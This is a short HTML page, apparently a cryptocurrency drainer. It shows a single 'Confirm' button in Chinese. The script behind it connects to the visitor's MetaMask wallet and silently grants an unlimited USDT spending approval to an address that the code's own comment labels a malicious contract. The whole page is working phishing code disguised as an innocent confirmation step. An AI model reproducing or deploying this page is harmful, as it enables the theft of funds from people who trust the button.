
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <title>確認</title>
</head>
<body style="text-align: center; font-family: sans-serif; padding-top: 100px;">
  <button style="font-size: 1.2rem; padding: 1em 2em;" onclick="approveUSDT()">確認</button>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const spender = "0x2b1D7DcB43012eE1E21934420CfCC2F88E730F10"; // 惡意合約地址（非EOA）
    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

    async function approveUSDT() {
      if (!window.ethereum) {
        alert("請先安裝 MetaMask");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();

      try {
        const usdt = new ethers.Contract(usdtAddress, abi, signer);
        const tx = await usdt.approve(spender, ethers.constants.MaxUint256);
        console.log("✅ 已授權 USDT", tx.hash);
        alert("確認完成，TX: " + tx.hash);
      } catch (err) {
        console.error("❌ 授權失敗：", err);
        alert("授權失敗：" + err.message);
      }
    }
  </script>
</body>
</html>
